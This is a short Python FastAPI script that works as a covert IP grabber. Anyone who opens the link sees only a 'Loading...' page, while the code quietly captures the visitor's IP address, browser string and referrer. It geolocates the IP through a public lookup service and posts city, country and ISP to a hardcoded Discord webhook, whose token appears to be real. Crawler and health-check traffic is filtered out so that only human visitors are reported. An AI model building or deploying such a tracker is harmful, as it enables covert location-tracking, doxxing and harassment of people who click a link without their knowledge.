from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import requests
import os

app = FastAPI()

# Replace with your actual Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1508148430185435199/giaJVqyE1NPX5CipNvqjBYa_NbHtGkLDeeI8aaS8pFQMKrSpAgC7zUPey3bDv_j2Wb5j"

@app.get("/")
async def log_request(request: Request):
    # 1. Identify the visitor (handling proxies)
    forwarded = request.headers.get("x-forwarded-for")
    client_ip = forwarded.split(',')[0].strip() if forwarded else request.client.host
    
    # 2. BOT FILTERING (Ignore Render/Google health checks)
    # If the IP starts with these, we log to console only (no Discord spam)
    bot_ips = ("34.", "35.", "104.", "66.249")
    if client_ip.startswith(bot_ips):
        print(f"DEBUG: Bot ping ignored: {client_ip}")
        return HTMLResponse(content="<h1>Loading...</h1>")

    print(f"DEBUG: Real visit detected from {client_ip}")

    # 3. Capture metadata
    user_agent = request.headers.get("user-agent", "Unknown")
    referrer = request.headers.get("referer", "Direct/None")

    # 4. Lookup location
    try:
        api_url = f"http://ip-api.com/json/{client_ip}?fields=status,country,city,isp,proxy,query"
        data = requests.get(api_url, timeout=5).json()
        
        if data.get("status") == "success":
            message = (
                f"**New Real Visitor!**\n"
                f"IP: `{data.get('query')}`\n"
                f"Location: `{data.get('city')}, {data.get('country')}`\n"
                f"ISP: `{data.get('isp')}` | Proxy: `{data.get('proxy')}`\n"
                f"Device: `{user_agent[:40]}...`\n"
                f"Referrer: `{referrer}`"
            )
            resp = requests.post(WEBHOOK_URL, json={"content": message}, timeout=5)
            print(f"DEBUG: Discord Status: {resp.status_code}")
    except Exception as e:
        print(f"DEBUG Error: {e}")

    return HTMLResponse(content="<h1>Loading...</h1>")
